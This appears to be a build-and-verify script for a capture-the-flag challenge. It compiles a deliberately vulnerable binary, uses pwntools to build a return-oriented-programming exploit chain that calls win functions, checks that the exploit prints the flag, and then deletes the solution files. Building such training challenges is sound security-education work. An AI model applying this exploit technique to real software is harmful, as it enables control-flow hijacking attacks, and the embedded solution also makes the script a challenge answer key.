import subprocess
import os
import sys
                    # chals_out/chal_name/team_name so 3
sys.path.insert(1, os.path.join(sys.path[0], '../../..'))
import shutil
from libchals import write_junk_calls, write_junk_body, fail_test
from pwn import context, ELF, ROP, p64

context.log_level = 'error'
FNULL = open(os.devnull, 'w')

def make_binary():
    # junk code generation
    write_junk_calls("main.c", 31, 2, reset=True)
    write_junk_calls("main.c", 22)
    write_junk_body("main.c", 16)

    subprocess.call("make", stdout=FNULL, stderr=FNULL)



    # input correction
    elf = ELF("simple_rop_2")
    rop = ROP(elf)
    win1 = elf.symbols['win_function1']
    win2 = elf.symbols['win_function2']
    flag = elf.symbols['flag']
    POP_ONCE = (rop.find_gadget(['pop rdi', 'ret']))[0]
    RET = (rop.find_gadget(['ret']))[0]

    padding = b'A' * 24

    exploit = padding + p64(win1) + p64(win2)
    exploit += p64(POP_ONCE) + p64(0xABADBABE) + p64(RET) + p64(flag)
    # rop is saved as input
    f = open("input", "wb")
    f.write(exploit)
    f.close()

    # strip it after the ropchain building so they don't have the symbols but we do
    #subprocess.call(["strip", "simple_rop_2"], stdout=FNULL, stderr=FNULL)

    # TESTING BINARY
    f=open("flag.txt", 'r')
    flag = f.readline()
    try:
        output = subprocess.check_output("./simple_rop_2 < input", shell=True, stderr=subprocess.STDOUT)
    except Exception as e:
        output = str(e.output)
    if not flag in output:
        return -1
    else:
        return 0

while True:
    shutil.copy("main.c", "main.c.org")
    if(make_binary()==0):
        break
    else:
        #fail_test()
        # unstable binary simple_rop_2, retrying entropy until
        # rng jesus is happy
        shutil.copy("main.c.org", "main.c")
os.remove("main.c")
os.remove("main.c.org")
os.remove("Makefile")
os.remove("setup.py")
# solution
os.remove("input")
os.remove("notes.txt")
